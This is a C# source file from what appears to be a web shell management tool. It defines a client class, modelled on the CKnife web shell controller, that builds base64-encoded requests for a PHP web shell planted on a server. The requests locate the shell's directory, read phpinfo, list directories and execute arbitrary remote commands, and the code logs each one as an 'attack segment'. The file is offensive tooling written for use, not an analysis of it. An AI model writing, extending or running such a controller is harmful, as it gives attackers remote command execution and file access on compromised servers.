using C2.Core;

namespace C2.Business.CastleBravo.WebShellTool
{
    class CKnife16EXEClient : CommonClient
    {
        public CKnife16EXEClient(string password, string clientSetting) 
            : base(password, clientSetting)
        {
            this.prefix = password + "=" + this.clientSetting.PHP_MAKE;
        }


        public override string PHPIndex()
        {
            string payload = prefix.Replace("@PARAM",clientSetting.PHP_INDEX);

            sb.AppendLine("定位D洞所在目录:")
              .AppendLine(payload)
              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_INDEX)))
              .AppendLine();

            return payload;
        }

        public override string PHPInfo()
        {
            string payload = prefix.Replace("@PARAM", clientSetting.PHP_INFO);

            sb.AppendLine("phpinfo:")
              .AppendLine(payload)
              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_INFO)))
              .AppendLine();

            return payload;
        }

        public override string PHPReadDict(string dict)
        {
            string attack = ST.DecodeBase64(clientSetting.PHP_READDICT).Replace("@PARAM2", dict);
            string payload = prefix.Replace("@PARAM", ST.EncodeBase64(attack));


            sb.AppendLine("遍历目录:")
              .AppendLine(payload)
              .AppendLine(string.Format("攻击段:{0}", attack))
              .AppendLine(string.Format("查询路径:{0}", ST.SuperDecodeBase64(dict)))
              .AppendLine();

            return payload;
        }

        public override string PHPShell(string shellEnv, string command)
        {

            string attack = ST.DecodeBase64(clientSetting.PHP_SHELL).Replace("@PARAM1", shellEnv).Replace("@PARAM2", command);
            string payload = prefix.Replace("@PARAM", ST.EncodeBase64(attack));

            sb.AppendLine("Remote Command:" + command)
              .AppendLine(payload)
              .AppendLine(string.Format("攻击段:{0}", attack))
              .AppendLine(string.Format("执行路径:{0}", ST.SuperDecodeBase64(shellEnv)))
              .AppendLine(string.Format("命令:{0}", ST.SuperDecodeBase64(command)))
              .AppendLine();

            return payload;
        }
    }
}
